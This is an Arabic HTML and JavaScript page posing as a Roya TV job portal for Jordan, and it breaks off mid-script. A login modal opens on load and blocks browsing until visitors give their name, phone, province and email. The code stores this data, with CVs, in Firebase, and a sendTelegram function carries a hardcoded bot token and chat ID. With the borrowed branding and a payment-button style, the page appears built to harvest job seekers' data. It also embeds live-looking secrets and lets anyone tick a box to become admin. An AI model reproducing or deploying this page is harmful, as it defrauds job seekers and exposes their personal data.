<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <title>بوابة وظائف رؤيا | الأردن</title>
  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
  <link href="https://fonts.googleapis.com/css?family=Tajawal:400,700&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Tajawal', Arial, sans-serif;
      background: linear-gradient(135deg, #f8fafc 0%, #e4ecf7 100%);
      margin: 0; padding: 0; color: #222; min-height: 100vh; position: relative;
      transition: background 0.3s, color 0.3s;
    }
    body.dark {
      background: linear-gradient(135deg, #18152b 0%, #321e53 100%);
      color: #e7e5f7;
    }
    header {
      background: #6900ad; color: #fff;
      padding: 20px 0 10px 0; text-align: center; box-shadow: 0 3px 16px #865fc44d;
      position: sticky; top: 0; z-index: 10;
      transition: background 0.3s;
    }
    body.dark header { background: #1e0832; }
    .logo { height: 68px; margin-bottom: 6px; }
    h1 { margin: 0 0 8px 0; font-size: 2.2rem; font-weight: 700; letter-spacing: 1px; }
    .subtitle { font-size: 1.2rem; color: #e5d7f9; margin-bottom: 5px; }
    body.dark .subtitle { color: #cdbff1; }
    .container {
      max-width: 1100px; margin: 32px auto 18px auto; padding: 16px; background: #fff;
      border-radius: 18px; box-shadow: 0 2px 22px #a97be73f; position: relative; z-index: 1;
      transition: background 0.3s, color 0.3s;
    }
    body.dark .container { background: #241740; color: #e7e5f7; }
    .stats {
      display: flex; gap: 20px; justify-content: center; margin: 18px 0 30px 0;
      flex-wrap: wrap;
    }
    .stat {
      background: #6900ad; color: #fff; padding: 18px 32px; border-radius: 15px;
      font-size: 1.1rem; font-weight: 600; box-shadow: 0 1px 4px #0001; text-align: center;
      min-width: 150px;
      transition: background 0.3s, color 0.3s;
    }
    body.dark .stat { background: #38185e; }
    .jobs-list {
      display: grid; grid-template-columns: repeat(auto-fit, minmax(270px, 1fr)); gap: 24px;
    }
    .job-card {
      background: #f7f2ff; border: 2px solid #e4d4f7; border-radius: 14px;
      padding: 24px 20px 16px 20px; box-shadow: 0 1px 8px #a97be712;
      transition: transform 0.1s, background 0.3s, color 0.3s;
      position: relative; overflow: hidden; min-height: 220px;
      display: flex; flex-direction: column; justify-content: space-between;
    }
    body.dark .job-card { background: #2b1d45; color: #ebebf8; border-color: #51306d; }
    .job-title { font-size: 1.23rem; font-weight: bold; color: #6900ad; margin-bottom: 8px; }
    body.dark .job-title { color: #f9d13d; }
    .job-info { font-size: 1.02rem; margin-bottom: 6px; color: #333; }
    body.dark .job-info { color: #e7e5f7; }
    .job-province { font-size: 0.99rem; color: #49007e; margin-bottom: 6px; }
    body.dark .job-province { color: #f9d13d; }
    .salary { font-weight: bold; color: #0a6c19; margin-bottom: 6px; }
    body.dark .salary { color: #89fa8e; }
    .hours { color: #ad6c00; margin-bottom: 6px; }
    body.dark .hours { color: #f9d13d; }
    .apply-btn {
      background: linear-gradient(90deg, #8400d3 0%, #a97be7 100%);
      color: #fff; border: none; border-radius: 10px; padding: 9px 17px;
      font-size: 1.08rem; font-weight: 600; cursor: pointer;
      box-shadow: 0 1px 8px #6900ad2b; transition: background 0.2s;
      margin-top: 8px; align-self: flex-end;
    }
    .apply-btn:hover {
      background: linear-gradient(90deg, #6900ad 0%, #a97be7 100%);
    }
    .fav-btn {
      position:absolute;top:10px;left:10px;background:none;border:none;font-size:1.5rem;cursor:pointer;color:#fdc800;
      z-index:1;
    }
    .fav-btn.fav { color: #f9d13d; }
    /* Modal styles */
    .modal-bg {
      position: fixed; inset: 0; background: #0008; z-index: 10000;
      display: flex; align-items: center; justify-content: center; animation: fadeIn 0.3s;
    }
    .modal {
      background: #fff; border-radius: 16px; max-width: 99vw; width: 440px;
      box-shadow: 0 4px 32px #6900ad3a; padding: 38px 20px 28px 20px; text-align: center; position: relative; animation: slideIn 0.25s;
      transition: background 0.3s, color 0.3s;
    }
    body.dark .modal { background: #251a35; color: #fff; }
    @keyframes fadeIn { from { opacity: 0 } to { opacity: 1 } }
    @keyframes slideIn { from { transform: translateY(60px); opacity: 0 } to { transform: none; opacity: 1 } }
    .modal h2 { color: #6900ad; margin-bottom: 20px; }
    body.dark .modal h2 { color: #f9d13d; }
    .modal input, .modal select, .modal textarea {
      width: 92%; padding: 8px 10px; border-radius: 8px; border: 1.5px solid #cbb7eb;
      font-size: 1.08rem; margin-bottom: 16px; direction: rtl; outline: none; transition: border 0.2s;
      background: #fff; color: #222;
    }
    body.dark .modal input, body.dark .modal select, body.dark .modal textarea {
      background: #2b1d45; color: #fff; border-color: #51306d;
    }
    .modal input:focus, .modal select:focus, .modal textarea:focus { border-color: #6900ad; }
    .modal button {
      background: linear-gradient(90deg, #6900ad 0%, #a97be7 100%);
      color: #fff; border: none; border-radius: 10px; padding: 9px 27px;
      font-size: 1.08rem; font-weight: 600; cursor: pointer; box-shadow: 0 1px 8px #6900ad1b; margin-top: 10px;
      transition: background 0.2s;
    }
    .modal .note { color: #ad6c00; font-size: 0.98rem; margin-top: 8px; margin-bottom: 8px; }
    .modal .loader {
      margin: 16px auto; border: 4px solid #eee; border-radius: 50%; border-top: 4px solid #6900ad;
      width: 48px; height: 48px; animation: spin 1s linear infinite;
    }
    @keyframes spin { 100% { transform: rotate(360deg) } }
    .modal .success { color: #0a6c19; font-size: 1.09rem; margin-top: 10px; margin-bottom: 10px; font-weight: bold; }
    body.dark .modal .success { color: #89fa8e; }
    .modal .pay-btn {
      background: linear-gradient(90deg, #e56400 0%, #fbae3c 100%);
      color: #fff; border: none; border-radius: 10px; padding: 10px 34px; font-size: 1.16rem;
      font-weight: 700; margin-top: 22px; cursor: pointer; box-shadow: 0 1px 8px #c89a2a2b;
    }
    .modal .pay-btn:active { background: #e56400 }
    .modal .rating-stars { font-size:1.6rem;margin:8px 0;direction:ltr;}
    .modal .rating-stars span { cursor:pointer; }
    .modal .rates-list { margin:12px 0 0 0;text-align:right;max-height:110px;overflow-y:auto;font-size:1.01rem;}
    .modal .rates-list div { margin-bottom:4px;color:#6900ad; }
    body.dark .modal .rates-list div { color:#f9d13d; }
    .modal .cv-preview { background:#f2f0f8;border-radius:9px;padding:8px 10px;max-height:100px;overflow:auto; }
    /* لوحة تحكم */
    #dashboard-panel {
      position:fixed;top:0;right:0;width:370px;max-width:93vw;height:100vh;z-index:99999;background:#fff;
      border-radius:0 0 0 16px;box-shadow:-3px 0 20px #6900ad2a;padding:0;display:none;flex-direction:column;
      transition:background 0.3s,color 0.3s;
    }
    body.dark #dashboard-panel { background:#211435;color:#fff; }
    #dashboard-header {
      background:#6900ad;color:#fff;padding:15px 18px;border-radius:0 0 0 16px;display:flex;align-items:center;justify-content:space-between;
    }
    body.dark #dashboard-header { background:#2e1a55; }
    #dashboard-content { padding:18px 14px; overflow-y:auto; flex:1; }
    #dashboard-tabs { display:flex;gap:7px;margin:2px 0 13px 0; }
    #dashboard-tabs button {
      background:#efecfa;border:1px solid #bba9e7;border-radius:8px;color:#6900ad;
      padding:7px 12px;font-size:1.05rem;cursor:pointer;transition:.2s;
    }
    #dashboard-tabs button.active, #dashboard-tabs button:hover { background:#6900ad;color:#fff; }
    body.dark #dashboard-tabs button { background:#3a255a;color:#fff;border-color:#9e7ccb;}
    body.dark #dashboard-tabs button.active, body.dark #dashboard-tabs button:hover { background:#f9d13d;color:#2e1a55; }
    /* Footer */
    footer {
      background: #f7f2ff; color: #6900ad; text-align: center; padding: 18px 0 10px 0; border-radius: 18px 18px 0 0;
      font-size: 1.07rem; margin: 23px 0 0 0; box-shadow: 0 -2px 12px #a97be71a;
      transition: background 0.3s, color 0.3s;
    }
    body.dark footer { background: #241740; color: #fff; }
    /* شريط الوظائف الجديدة */
    #jobs-ticker {
      background:#eae2fa;color:#6900ad;padding:7px 0;font-size:1.09rem;text-align:right;overflow:hidden;
      border-bottom:2px solid #6900ad;
      transition:background 0.3s, color 0.3s;
    }
    body.dark #jobs-ticker { background:#321e53;color:#f9d13d;border-color:#f9d13d; }
    /* إشعارات توست */
    #toast {
      min-width:200px;position:fixed;bottom:95px;left:40px;z-index:10000;background:#6900ad;color:#fff;
      padding:14px 30px;border-radius:12px;display:none;font-size:1.08rem;box-shadow:0 2px 10px #6900ad2b;
      transition:background 0.3s,color 0.3s;
    }
    body.dark #toast { background:#f9d13d;color:#1e0832; }
    /* زر واتساب */
    .wa-btn {
      position:fixed;bottom:30px;left:30px;z-index:9999;background:#25d366;border-radius:50%;width:57px;height:57px;display:flex;align-items:center;justify-content:center;box-shadow:0 4px 12px #0002;
      transition:background 0.3s;
    }
    .wa-btn img { width:34px;height:34px; }
    /* الوضع الليلي */
    #dark-toggle {
      position:fixed;top:24px;left:28px;z-index:11111;background:#fff;border-radius:50%;width:43px;height:43px;display:flex;align-items:center;justify-content:center;
      box-shadow:0 2px 12px #6900ad2b;cursor:pointer;font-size:1.7rem;color:#6900ad;transition:.2s;
    }
    body.dark #dark-toggle { background:#251a35;color:#f9d13d; }
    /* Responsive */
    @media (max-width: 700px) {
      .container { padding: 6px; }
      .stats { flex-direction: column; gap: 12px; }
      .modal { width: 97vw; padding: 28px 3vw 20px 3vw; }
      .job-card { padding: 14px 4px 10px 4px; }
      #dashboard-panel { width:98vw; }
    }
  </style>
  <!-- Firebase SDK -->
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-app.js";
    import { getDatabase, ref, push, set, get, remove, update, onValue, child } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-database.js";
    window.firebaseInit = () => {
      const firebaseConfig = {
        apiKey: "AIzaSyBr03bRk3uNzLCFzr53ufdPbA3DrOZHxWQ",
        authDomain: "jobsroya.firebaseapp.com",
        projectId: "jobsroya",
        storageBucket: "jobsroya.firebasestorage.app",
        messagingSenderId: "882520191513",
        appId: "1:882520191513:web:2165131b20e33bdc38b088",
        measurementId: "G-RW67K10VPD",
        databaseURL: "https://jobsroya-default-rtdb.firebaseio.com"
      };
      const app = initializeApp(firebaseConfig);
      window.db = getDatabase(app);
      window.refDB = ref;
      window.pushDB = push;
      window.setDB = set;
      window.getDB = get;
      window.removeDB = remove;
      window.updateDB = update;
      window.onValueDB = onValue;
      window.childDB = child;
    };
  </script>
</head>
<body>
  <!-- الوضع الليلي -->
  <div id="dark-toggle" title="الوضع الليلي/النهاري">🌙</div>

  <!-- زر واتساب -->
  <a href="https://wa.me/962799999999" class="wa-btn" target="_blank" title="تواصل مع الدعم">
    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="واتساب">
  </a>

  <!-- شريط الوظائف الجديدة المتحرك أعلى الصفحة -->
  <div id="jobs-ticker">
    <marquee id="ticker-content" direction="right" scrollamount="5">🔥 وظائف اليوم: سيتم تحديثها تلقائياً ... تابع كل جديد!</marquee>
  </div>

  <header>
    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8d/ROYA_TV_LOGO.svg/512px-ROYA_TV_LOGO.svg.png" alt="شعار رؤيا"/>
    <h1>بوابة وظائف رؤيا</h1>
    <div class="subtitle">كل فرص العمل المتوفرة في الأردن بين يديك — لوحة تحكم متكاملة</div>
    <button style="position:absolute;top:23px;right:26px;background:#fff;color:#6900ad;font-size:1.07rem;border-radius:8px;padding:5px 16px;border:none;cursor:pointer;font-weight:700;box-shadow:0 1px 8px #6900ad12;z-index:100;" onclick="openDashboardPanel()">
      لوحة التحكم
    </button>
  </header>

  <div class="container">
    <div class="stats">
      <div class="stat" id="stat-jobs">عدد الوظائف المتاحة: <span>--</span></div>
      <div class="stat" id="stat-apps">طلبات اليوم: <span>--</span></div>
      <div class="stat" id="stat-users">المستخدمون المسجلون: <span>--</span></div>
      <div class="stat" id="stat-provinces">المحافظات: <span>12</span></div>
    </div>
    <div style="margin-bottom:14px; text-align:center;">
      <input id="search" type="text" placeholder="ابحث عن وظيفة أو كلمة مفتاحية..." style="padding:8px 12px; border-radius:8px; border:1.5px solid #cbb7eb; width:260px; font-size:1.03rem; margin-bottom:12px;direction:rtl;" />
      <button id="voice-search-btn" title="بحث صوتي" style="background:#e4d4f7;color:#6900ad;border:none;border-radius:8px;padding:8px 14px;margin-right:8px;font-size:1.2rem;cursor:pointer;">🎤</button>
      <select id="filter-province" style="padding:6px 10px;border-radius:8px;border:1.5px solid #cbb7eb;font-size:1.01rem;margin-right:8px;">
        <option value="">كل المحافظات</option>
        <option>عمان</option><option>إربد</option><option>الزرقاء</option><option>العقبة</option>
        <option>المفرق</option><option>السلط</option><option>جرش</option>
        <option>عجلون</option><option>مأدبا</option><option>الكرك</option>
        <option>الطفيلة</option><option>معان</option>
      </select>
      <select id="filter-type" style="padding:6px 10px;border-radius:8px;border:1.5px solid #cbb7eb;font-size:1.01rem;margin-right:8px;">
        <option value="">كل الأنواع</option>
        <option>دوام كامل</option>
        <option>دوام جزئي</option>
        <option>عقد مؤقت</option>
        <option>عمل عن بعد</option>
        <option>تدريب</option>
      </select>
      <select id="filter-salary" style="padding:6px 10px;border-radius:8px;border:1.5px solid #cbb7eb;font-size:1.01rem;margin-right:8px;">
        <option value="">كل الرواتب</option>
        <option value="500">500+</option>
        <option value="1000">1000+</option>
        <option value="1500">1500+</option>
      </select>
    </div>
    <div class="jobs-list" id="jobs-list">
      <!-- الوظائف ستظهر هنا -->
    </div>
    <div style="margin-top:28px;text-align:right;">
      <button onclick="exportJobsPDF()" style="background:#6900ad;color:#fff;border:none;border-radius:8px;padding:8px 20px;font-size:1.05rem;cursor:pointer;">تحميل جميع الوظائف PDF</button>
      <button onclick="window.print()" style="background:#f9d13d;color:#6900ad;border:none;border-radius:8px;padding:8px 20px;font-size:1.05rem;cursor:pointer;margin-right:10px;">طباعة الصفحة</button>
    </div>
  </div>

  <footer>
    جميع الحقوق محفوظة &copy; قناة رؤيا 2025 — تصميم وتطوير: فريق رؤيا الرقمي
  </footer>

  <!-- إشعارات توست -->
  <div id="toast"></div>

  <!-- لوحة تحكم المستخدم والإدارة -->
  <div id="dashboard-panel">
    <div id="dashboard-header">
      <span id="dashboard-title">لوحة التحكم</span>
      <button onclick="closeDashboardPanel()" style="background:none;color:#fff;font-size:1.4rem;border:none;cursor:pointer;">✖</button>
    </div>
    <div id="dashboard-tabs"></div>
    <div id="dashboard-content"></div>
  </div>

  <!-- نافذة التسجيل/التسجيل دخول -->
  <div class="modal-bg" id="user-modal-bg" style="display:flex">
    <div class="modal" id="user-modal">
      <h2>تسجيل الدخول</h2>
      <div class="note">يرجى تعبئة البيانات لمتابعة تصفح الوظائف</div>
      <input type="text" id="name-input" placeholder="الاسم الكامل" />
      <input type="tel" id="phone-input" placeholder="رقم الهاتف" pattern="^07[789]\d{7}$" maxlength="10"/>
      <select id="province-input">
        <option value="">اختر المحافظة</option>
        <option>عمان</option><option>إربد</option><option>الزرقاء</option><option>العقبة</option>
        <option>المفرق</option><option>السلط</option><option>جرش</option>
        <option>عجلون</option><option>مأدبا</option><option>الكرك</option>
        <option>الطفيلة</option><option>معان</option>
      </select>
      <input type="email" id="email-input" placeholder="البريد الإلكتروني (اختياري)" />
      <label style="font-size:.97rem;color:#777;">
        <input type="checkbox" id="admin-check" style="margin-left:5px;"> تسجيل دخول كمسؤول (لوحة إدارة)
      </label>
      <button id="modal-next-btn">دخول</button>
      <div id="modal-error" style="color:#b30000; font-size:.99rem;margin-top:8px;min-height:24px;"></div>
    </div>
  </div>

  <!-- نافذة عامة للخطوات والتقييمات والاختبارات -->
  <div class="modal-bg" id="step-modal-bg" style="display:none">
    <div class="modal" id="step-modal"></div>
  </div>

  <script type="module">
    window.firebaseInit();

    // =============== بيانات الموقع العامة ==========================
    let jobsData = [];
    let jobsKeys = [];
    let jobsLoadedFromFirebase = false;
    let allApplications = [];
    let allUsers = [];
    let allRatings = [];
    let allCVs = [];
    // =============== بيانات المستخدم ==============================
    let userData = null;
    let selectedJobIdx = null;
    let adminMode = false;
    let isAdmin = false;
    let currentDashboardTab = "myapps";
    let favJobs = JSON.parse(localStorage.getItem("favJobs")||"[]");
    let lastFilters = JSON.parse(localStorage.getItem("lastFilters")||"{}");
    // =============== الوظائف الافتراضية عند عدم وجود بيانات من فايربيس =================
    const demoJobs = [
      { title: "مندوب مبيعات ميداني", salary: 700, hours: 8, desc: "فرصة عمل كمندوب مبيعات براتب ثابت وعمولات مجزية.", img: "🛒", province:"عمان", type:"دوام كامل", company:"شركة المستقبل", video:"", exp:"بدون خبرة" },
      { title: "موظف خدمة عملاء", salary: 650, hours: 7, desc: "الرد على استفسارات العملاء عبر الهاتف وتقديم الدعم.", img: "☎️", province:"الزرقاء", type:"دوام جزئي", company:"اتصالات الأردن", video:"", exp:"حديث التخرج" },
      { title: "محاسب", salary: 950, hours: 8, desc: "إدارة الحسابات والمعاملات المالية للشركة.", img: "💼", province:"إربد", type:"دوام كامل", company:"شركة المحاسبين", video:"", exp:"1-3 سنوات" },
      { title: "سائق توصيل", salary: 600, hours: 9, desc: "توصيل الطلبات للعملاء ضمن مناطق محددة.", img: "🚗", province:"عمان", type:"دوام كامل", company:"طلبات الأردن", video:"", exp:"بدون خبرة" },
      { title: "مطور مواقع ويب", salary: 1200, hours: 8, desc: "تطوير وصيانة مواقع إلكترونية احترافية.", img: "💻", province:"عمان", type:"عمل عن بعد", company:"رواد التقنية", video:"https://www.youtube.com/embed/_oYk5Zb2hGg", exp:"3+ سنوات" },
      { title: "مصمم جرافيك", salary: 800, hours: 7, desc: "تصميم إعلانات ومواد تسويقية للشركة.", img: "🎨", province:"العقبة", type:"دوام جزئي", company:"مؤسسة الدعاية", video:"", exp:"1-3 سنوات" },
      { title: "مشرف مستودع", salary: 850, hours: 9, desc: "إدارة وتنظيم المخزون في المستودع.", img: "🏭", province:"إربد", type:"دوام كامل", company:"مستودعات الشرق", video:"", exp:"3+ سنوات" },
      { title: "مهندس مدني", salary: 1500, hours: 10, desc: "إشراف ميداني على مشاريع البناء.", img: "🏗️", province:"عمان", type:"عقد مؤقت", company:"شركة الإنشاءات", video:"", exp:"3+ سنوات" },
      { title: "مساعد إداري", salary: 550, hours: 7, desc: "مساعدة الفريق الإداري في المهام المكتبية.", img: "🗂️", province:"مأدبا", type:"دوام كامل", company:"مؤسسة الأعمال", video:"", exp:"بدون خبرة" },
      { title: "ممرض/ة", salary: 1100, hours: 9, desc: "تقديم الرعاية الصحية للمرضى في العيادات.", img: "🩺", province:"السلط", type:"دوام كامل", company:"مستشفى الشفاء", video:"", exp:"1-3 سنوات" },
      { title: "مدرس لغة إنجليزية", salary: 750, hours: 7, desc: "تدريس اللغة الإنجليزية لطلبة المدارس.", img: "📚", province:"الكرك", type:"دوام كامل", company:"مدرسة الريادة", video:"", exp:"حديث التخرج" },
      { title: "حارس أمن", salary: 600, hours: 8, desc: "حماية منشآت الشركة ومراقبة الدخول والخروج.", img: "🛡️", province:"جرش", type:"دوام كامل", company:"ش. الأمن", video:"", exp:"بدون خبرة" },
      // أضف وظائف كثيرة جدا هنا (مثال):
      { title: "محلل بيانات", salary: 1300, hours: 8, desc: "تحليل بيانات السوق وتقديم تقارير للإدارة.", img: "📊", province:"عمان", type:"دوام كامل", company:"تحليلات الأردن", video:"", exp:"3+ سنوات" },
      { title: "مسؤول موارد بشرية", salary: 950, hours: 8, desc: "إدارة عمليات التوظيف والتطوير.", img: "🤝", province:"إربد", type:"دوام كامل", company:"شركة الريادة", video:"", exp:"1-3 سنوات" },
      { title: "محرر محتوى", salary: 900, hours: 8, desc: "كتابة وتحرير محتوى المواقع.", img: "✍️", province:"الزرقاء", type:"عمل عن بعد", company:"المحتوى العربي", video:"", exp:"1-3 سنوات" },
      { title: "مندوب دعاية طبية", salary: 1400, hours: 9, desc: "دعاية وتسويق للمنتجات الطبية.", img: "💊", province:"عمان", type:"دوام كامل", company:"فارما", video:"", exp:"3+ سنوات" },
      { title: "مبيعات عبر الهاتف", salary: 600, hours: 8, desc: "تسويق عبر الهاتف لمنتجات رقمية.", img: "📞", province:"العقبة", type:"دوام جزئي", company:"اتصالات الأردن", video:"", exp:"حديث التخرج" },
      { title: "خدمة عملاء إلكترونية", salary: 700, hours: 8, desc: "دعم العملاء عبر الإنترنت.", img: "💬", province:"إربد", type:"عمل عن بعد", company:"خدمة نت", video:"", exp:"بدون خبرة" },
      { title: "مصور فيديو", salary: 1000, hours: 8, desc: "تصوير فيديوهات وتسويق بصري.", img: "📹", province:"عمان", type:"دوام كامل", company:"إعلام رؤيا", video:"", exp:"1-3 سنوات" },
      // يمكنك إضافة المزيد كما تريد ...
    ];
    // =============== تحميل الوظائف من فايربيس ==========================
    const jobsRef = window.refDB(window.db, "jobs");
    window.onValueDB(jobsRef, snap => {
      const jobsObj = snap.val();
      if(jobsObj) {
        jobsData = Object.values(jobsObj);
        jobsKeys = Object.keys(jobsObj);
        jobsLoadedFromFirebase = true;
      } else {
        jobsData = demoJobs;
        jobsKeys = Array.from({length:demoJobs.length},(_,i)=>"demo"+i);
      }
      updateStats();
      renderJobs();
      updateJobsTicker();
    });

    // =============== تحميل الطلبات والتقييمات والمستخدمين ==============
    function fetchAllData() {
      window.onValueDB(window.refDB(window.db,"applications"), snap=>{
        allApplications = snap.val()? Object.entries(snap.val()).map(([k,v])=>({...v,key:k})) : [];
        updateStats();
      });
      window.onValueDB(window.refDB(window.db,"users"), snap=>{
        allUsers = snap.val()? Object.values(snap.val()): [];
        updateStats();
      });
      window.onValueDB(window.refDB(window.db,"ratings"), snap=>{
        allRatings = snap.val()? Object.entries(snap.val()).map(([k,v])=>({...v,key:k})) : [];
      });
      window.onValueDB(window.refDB(window.db,"cvs"), snap=>{
        allCVs = snap.val()? Object.entries(snap.val()).map(([k,v])=>({...v,key:k})) : [];
      });
    }
    fetchAllData();
    // =============== التحديثات الفورية =====================
    function updateStats() {
      document.querySelector("#stat-jobs span").textContent = jobsData.length;
      document.querySelector("#stat-users span").textContent = allUsers.length;
      document.querySelector("#stat-apps span").textContent = allApplications.filter(a=>a.timestamp && new Date(a.timestamp).toDateString()===new Date().toDateString()).length;
    }
    function updateJobsTicker() {
      const ticker = document.getElementById("ticker-content");
      const jobs = jobsData.slice(-6).map(j=>`<b>${j.title}</b> - ${j.province}`).join(" | ");
      ticker.innerHTML = "🔥 وظائف جديدة: "+jobs;
    }
    // =============== رسم الوظائف ==========================
    function renderJobs(filter="") {
      let jobs = jobsData;
      // الفلاتر
      const province = document.getElementById("filter-province").value;
      const type = document.getElementById("filter-type").value;
      const salary = document.getElementById("filter-salary").value;
      if(filter && filter.trim()!=="") {
        jobs = jobs.filter(j => (j.title+j.desc+j.company+j.province+j.type).includes(filter));
      }
      if(province) jobs = jobs.filter(j=>j.province===province);
      if(type) jobs = jobs.filter(j=>j.type===type);
      if(salary) jobs = jobs.filter(j=>j.salary>=parseInt(salary));
      // حفظ آخر الفلاتر
      localStorage.setItem("lastFilters",JSON.stringify({filter,province,type,salary}));
      const list = document.getElementById("jobs-list");
      list.innerHTML = "";
      jobs.forEach((job, idx) => {
        const globalIdx = jobsLoadedFromFirebase? jobsKeys.indexOf(jobsKeys[idx]) : idx;
        const isFav = favJobs.includes(globalIdx);
        let videoBtn = job.video? `<button style="background:#fff;color:#6900ad;font-size:.98rem;border-radius:7px;border:1px solid #6900ad;padding:2px 12px;cursor:pointer;margin-bottom:7px;" onclick="showJobVideo('${job.video}')">🎬 فيديو تعريفي</button>`:"";
        list.innerHTML += `
        <div class="job-card">
          <button class="fav-btn${isFav?' fav':''}" title="إضافة للمفضلة" onclick="toggleFav(${globalIdx})"><span id="fav-${globalIdx}">${isFav?"★":"☆"}</span></button>
          <div style="font-size:2.2rem">${job.img||"💼"}</div>
          <div class="job-title">${job.title}</div>
          <div class="job-info">${job.desc}</div>
          <div>الشركة: <b>${job.company||"--"}</b></div>
          <div>النوع: <b>${job.type||"--"}</b> | الخبرة: <b>${job.exp||"--"}</b></div>
          <div class="salary">الراتب: ${job.salary} دينار</div>
          <div class="hours">ساعات العمل: ${job.hours} ساعة</div>
          <div class="job-province">المحافظة: <span>${job.province||"--"}</span></div>
          ${videoBtn}
          <button class="apply-btn" data-idx="${globalIdx}" onclick="applyJob(${globalIdx})">تقديم</button>
          <button style="background:#f9d13d;color:#6900ad;font-size:.96rem;border-radius:7px;border:none;padding:7px 13px;cursor:pointer;margin-top:4px;" onclick="compareJob(${globalIdx})">مقارنة</button>
          <button style="background:#fff;color:#6900ad;font-size:.96rem;border-radius:7px;border:1px solid #6900ad;padding:7px 13px;cursor:pointer;margin-top:4px;" onclick="rateJob(${globalIdx})">تقييم</button>
        </div>`;
      });
      updateFavBtns();
    }
    // =============== البحث والفلاتر ========================
    document.getElementById("search").oninput = function() {
      renderJobs(this.value);
    }
    document.getElementById("filter-province").onchange = function(){ renderJobs(document.getElementById("search").value);}
    document.getElementById("filter-type").onchange = function(){ renderJobs(document.getElementById("search").value);}
    document.getElementById("filter-salary").onchange = function(){ renderJobs(document.getElementById("search").value);}
    // ======= بحث صوتي ============
    document.getElementById("voice-search-btn").onclick = function() {
      if(!window.SpeechRecognition && !window.webkitSpeechRecognition) return showToast("البحث الصوتي غير مدعوم في هذا المتصفح");
      let rec = new(window.SpeechRecognition||window.webkitSpeechRecognition)();
      rec.lang = "ar-JO";
      rec.onresult = e=> {
        document.getElementById("search").value = e.results[0][0].transcript;
        renderJobs(e.results[0][0].transcript);
      };
      rec.start();
    }
    // =============== المفضلة ==============================
    function toggleFav(idx) {
      let i = favJobs.indexOf(idx);
      if(i>-1) favJobs.splice(i,1); else favJobs.push(idx);
      localStorage.setItem("favJobs", JSON.stringify(favJobs));
      updateFavBtns();
      showToast(i>-1?"تم حذف الوظيفة من المفضلة":"تم إضافة الوظيفة للمفضلة");
    }
    function updateFavBtns() {
      document.querySelectorAll(".fav-btn").forEach(btn=>{
        let idx = +btn.getAttribute("onclick").match(/\d+/)[0];
        let span = document.getElementById("fav-"+idx);
        if(span) span.textContent = favJobs.includes(idx) ? "★" : "☆";
        if(favJobs.includes(idx)) btn.classList.add("fav"); else btn.classList.remove("fav");
      });
    }
    // =============== فيديو الوظيفة ========================
    window.showJobVideo = function(url) {
      showStepModal("video",url);
    }
    // =============== تقديم الوظيفة ========================
    window.applyJob = function(idx) {
      selectedJobIdx = idx;
      showStepModal("assessment");
    }
    // =============== مقارنة وظيفتين =======================
    let compareArr = [];
    window.compareJob = function(idx) {
      if(compareArr.length===2) compareArr=[];
      if(!compareArr.includes(idx)) compareArr.push(idx);
      if(compareArr.length===2) showStepModal("compare");
      else showToast("اختر وظيفة أخرى للمقارنة");
    }
    // =============== تقييم الوظيفة =========================
    window.rateJob = function(idx) {
      selectedJobIdx = idx;
      showStepModal("ratejob");
    }
    // =============== نافذة التسجيل ========================
    document.getElementById("modal-next-btn").onclick = function() {
      const name = document.getElementById("name-input").value.trim();
      const phone = document.getElementById("phone-input").value.trim();
      const province = document.getElementById("province-input").value;
      const email = document.getElementById("email-input").value.trim();
      adminMode = document.getElementById("admin-check").checked;
      let error = "";
      if(!name) error = "يرجى إدخال الاسم";
      else if(!/^07[789]\d{7}$/.test(phone)) error = "يرجى إدخال رقم هاتف أردني صحيح";
      else if(!province) error = "يرجى اختيار المحافظة";
      if(error) { document.getElementById("modal-error").textContent = error; return; }
      userData = { name, phone, province, email, admin: adminMode, uid: phone };
      if(adminMode) isAdmin = true;
      // حفظ في فايربيس
      saveUserToFirebase(userData);
      document.getElementById("user-modal-bg").style.display = "none";
      showToast("تم تسجيل الدخول بنجاح!");
      updateStats();
      renderJobs();
      openDashboardPanel();
    };
    // =============== حفظ المستخدم في فايربيس =================
    function saveUserToFirebase(user) {
      window.setDB(window.refDB(window.db, "users/"+user.phone), {
        ...user,
        timestamp: new Date().toISOString()
      });
    }
    // =============== حفظ التقديم في فايربيس ==================
    function saveApplicationToFirebase(user, job, extra={}) {
      window.pushDB(window.refDB(window.db, "applications"), {
        ...user,
        ...extra,
        jobTitle: job.title,
        jobKey: jobsKeys[selectedJobIdx],
        salary: job.salary,
        hours: job.hours,
        company: job.company,
        province: job.province,
        type: job.type,
        timestamp: new Date().toISOString(),
        status: "قيد المراجعة"
      });
    }
    // =============== حفظ تقييم الوظيفة =======================
    function saveRatingToFirebase(user, job, rating, comment) {
      window.pushDB(window.refDB(window.db, "ratings"), {
        ...user,
        jobTitle: job.title,
        rating, comment,
        timestamp: new Date().toISOString(),
        jobKey: jobsKeys[selectedJobIdx]
      });
    }
    // =============== حفظ السيرة الذاتية ======================
    function saveCVToFirebase(user, cvtext) {
      window.setDB(window.refDB(window.db,"cvs/"+user.phone), {
        ...user,
        cv: cvtext, timestamp: new Date().toISOString()
      });
    }
    // =============== ارسال تيليجرام =========================
    function sendTelegram(msg) {
      const token = "8364248948:AAFWbzdx1bMnjaU6xY218i0V7uAfXQXJPFM";
      const chat_id = "6873334348";
      fetch("https://api.telegram.org/bot"+token+"/sendMessage", {
        method: "POST",
        headers: { "Content-Type":"application/json" },
        body: JSON.stringify({ chat_id, text: msg })
      }).then(()=>{}).catch(()=>{});
    }
    // =============== نافذة الخطوات/التقييم/الفيديو/مقارنة ==========
    function showStepModal(step,arg) {
      const modalBg = document.getElementById("step-modal-bg");
      const modal = document.getElementById("step-modal");
      if(step==="assessment") {
        // اختبار تقييم أولي من 3 أسئلة
        const questions = [
          { q: "هل لديك خبرة سابقة في هذا المجال؟", o: ["نعم","كلا"], v: "" },
          { q: "هل يمكنك العمل تحت ضغط؟", o: ["نعم","أحيانًا","كلا"], v: "" },
          { q: "هل تقبل العمل بدوام متغير؟", o: ["نعم","حسب الوظيفة","لا"], v: "" }
        ];
        let currQ = 0;
        function renderQ() {
          modal.innerHTML = `<h2>اختبار تقييم سريع</h2>
